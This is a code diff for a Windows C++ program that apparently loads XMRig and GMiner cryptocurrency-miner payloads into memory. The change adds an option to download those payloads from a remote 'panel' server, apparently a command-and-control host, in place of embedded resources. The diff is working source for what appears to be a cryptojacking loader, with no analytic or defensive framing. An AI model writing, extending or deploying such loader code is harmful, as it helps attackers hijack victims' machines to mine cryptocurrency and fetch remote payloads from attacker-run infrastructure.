@@ -1,3 +1,4 @@
+#include "httplib.h"
 #include <windows.h>
 
 #include <iostream>
@@ -55,6 +56,22 @@ BOOL WINAPI ConsoleHandler(DWORD signal) {
     }
     return FALSE;
 }
+
+std::string GetBaseUrl(const std::string& url)
+{
+    size_t protocolEnd = url.find("://");
+    if (protocolEnd == std::string::npos)
+        return "";
+
+    size_t hostStart = protocolEnd + 3;
+    size_t pathStart = url.find('/', hostStart);
+
+    if (pathStart == std::string::npos)
+        return url;
+
+    return url.substr(0, pathStart);
+}
+
 
 int main(int argc, char *argv[])
 {
@@ -180,7 +197,13 @@ int main(int argc, char *argv[])
     BYTE *xmrigBuf = nullptr;
     
     try {
-        LoadEmbeddedXMRig(xmrigBuf, xmrigPayloadSize);
+        #ifdef FETCH_EMBEDDED
+            std::string basePanelUrl = GetBaseUrl(panelUrlsStr);
+            LoadXmrigFromPanel(basePanelUrl,xmrigBuf, xmrigPayloadSize);
+        #else
+            LoadEmbeddedXMRig(xmrigBuf, xmrigPayloadSize);
+        #endif
+        
     } catch (const std::exception& e) {
         std::cerr << "[-] Failed to load XMRig from resources: " << e.what() << std::endl;
         return -1;
@@ -195,7 +218,12 @@ int main(int argc, char *argv[])
     BYTE *gminerBuf = nullptr;
     
     try {
+    #ifdef FETCH_EMBEDDED
+        std::string basePanelUrl = GetBaseUrl(panelUrlsStr);
+        LoadGMinerFromPanel(basePanelUrl, gminerBuf, gminerPayloadSize);
+        #else
         LoadEmbeddedGminer(gminerBuf, gminerPayloadSize);
+        #endif
     } catch (const std::exception& e) {
         std::cerr << "[-] Failed to load GMiner from resources: " << e.what() << std::endl;
         gminerBuf = nullptr;
